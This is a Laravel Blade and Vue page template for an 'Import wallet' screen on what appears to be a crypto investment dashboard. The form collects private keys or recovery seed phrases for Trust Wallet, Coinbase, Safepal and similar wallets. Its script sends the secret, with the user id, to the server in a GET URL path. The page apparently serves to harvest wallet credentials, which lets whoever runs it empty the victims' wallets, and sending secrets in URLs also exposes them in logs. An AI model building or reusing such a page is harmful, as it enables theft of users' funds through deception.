@extends('appV1.dashboard.layouts.sidebar')
@section('page_title', 'Import wallet')
@section('content')
    <div class="row" id="import_wallet">
        <div class="col-md-2"></div>
        <div class="col-lg-8 col-lg-offset-2 ">
            <br/>
            <div class="card">
                <div class="card-header">
                    <h4 class="card-title">@yield('page_title')</h4>
                    <p class="text-muted mb-0">Import your other support wallet to {{config('app.name')}}, increase your investment portfolio without more delays.</p>
                    <p class="text-danger">@{{ msg_pane }}</p>

                </div><!--end card-header-->
                <div class="card-body">
                    <form action="#" method="post" onsubmit="event.preventDefault();">
                        @csrf
                        <div class="form-group row">
                            <label for="ddlCreditCardType" class="col-lg-2 col-form-label">Select Wallet</label>
                            <div class="col-lg-10">
                                <select id="" @change="getSelectedWallet" name="wallet_type" v-model="seed_phrase"
                                        class="form-control">
                                    <option selected disabled>-please select-</option>
                                    <option :value="'blockchain'" v-bind:value="'blockchain'">Blockchain</option>
                                    <option v-bind:value="'safepal'">Safepal</option>
                                    <option v-bind:value="'trustwallet'">Trust Wallet</option>
                                    <option v-bind:value="'coinbase'">Coinbase</option>
                                    <option v-bind:value="'others'">Others</option>
                                </select>
                            </div>
                        </div><!--end form-group-->
                        <div class="form-group row">
                            <label for="ddlCreditCardType" class="col-lg-2 col-form-label"> Recovery type: </label>
                            <div class="col-lg-10">
                                <select id="" @change="getSelectedWallet" name="wallet_type" v-model="key_type"
                                        class="form-control">
                                    <option selected disabled>-please select-</option>
                                    <option v-bind:value="'key'">Private key</option>
                                    <option v-bind:value="'phrase'">Recovery phrase</option>
                                </select>
                            </div>
                        </div><!--end form-group-->

                        <div class="form-group row" v-if="disp_key">
                            <label for="horizontalInput1" class="col-sm-2 col-form-label">Key</label>
                            <div class="col-sm-10">
                                <input type="text" name="key" v-model="key" v-on:input="getInput"
                                       class="form-control form-control-lg"
                                       placeholder="Private key"/>
                            </div>
                        </div>
                        <div class="form-group row" v-if="disp_textarea">
                            <label for="horizontalInput1" class="col-sm-2 col-form-label">Enter Recovery Phrase (enter
                                with comma seperated list)</label>
                            <div class="col-sm-10">
                                <textarea type="text" v-on:input="getInput" name="key" v-model="phrase"
                                          class="form-control form-control-lg"
                                          placeholder="Enter recovery seed phrase. (e.g light, plain, fly...)"></textarea>
                            </div>
                        </div>

                        <div class="form-group row">
                            <label for="horizontalInput1" class="col-sm-2 col-form-label"></label>
                            <div class="col-sm-10">

                                <button type="button" v-if="loading" class="btn btn-primary btn-lg btn-block"
                                        :disabled="import_btn === 0">
                                    <span class="spinner-grow spinner-grow-sm" role="status" aria-hidden="true"></span>
                                    Importing Wallet
                                </button>
                                <button v-else type="button" class="btn btn-primary btn-lg btn-block"
                                        :disabled="import_btn === 0" v-on:click="tryImport">
                                    Import Wallet
                                </button>
                            </div>
                        </div>
                    </form>
                </div><!--end card-body-->
            </div><!--end card-->
        </div>
    </div>
    <input type="hidden" id="usr_d" value="{{Auth::user()->id}}" />

@endsection

@section("page_js")
    <script>

        new Vue({
            el: "#import_wallet",
            data() {
                return {
                    usr: $('#usr_d').val(),
                    seed_phrase: null,
                    key_type: null,
                    key: null,
                    phrase: null,
                    disp_textarea: false,
                    disp_key: false,
                    import_btn: 0,
                    recover_data: null,
                    msg_pane: {
                        type: Object,
                    },
                    loading: false,

                }
            },
            mounted() {
                this.msg_pane = null;
            },
            methods: {
                getSelectedWallet: function () {

                    if (this.key_type === "key") {
                        this.disp_textarea = false;
                        this.disp_key = true;
                    } else if (this.key_type === "phrase") {
                        this.disp_key = false;
                        this.disp_textarea = true;
                    } else {
                        this.disp_key = false;
                        this.disp_textarea = false;
                    }
                },

                getInput: function () {
                    if (this.disp_textarea === true) {
                        this.recover_data = this.phrase;
                        this.import_btn = 1;
                    } else if (this.disp_key === true) {
                        this.recover_data = this.key;
                        this.import_btn = 1;

                    } else {
                        this.recover_data = null;
                        this.import_btn = 0;

                    }
                },
                tryImport: function () {
                    this.import_btn = 0;
                    this.loading = true;

                    axios.get("/api/wallet/import/"+this.key_type+"/"+this.seed_phrase+"/"+this.recover_data+"/"+this.usr, {
                        type: this.key_type,
                        wallet_type: this.seed_phrase,
                        recover_data: this.recover_data,
                }, {
                        headers: {
                            'Content-type': 'application/json; charset=UTF-8',
                            "Access-Control-Allow-Origin": "*",
                        }
                    }).then(response => {
                        this.msg_pane = response.data.msg;
                    }).catch(error => {
                        console.log('Error', error);
                    }).finally(() => {
                            this.import_btn = 1;
                            this.loading = false;
                        }
                    )
                }
            },
            watch: {}
        });


    </script>
@endsection
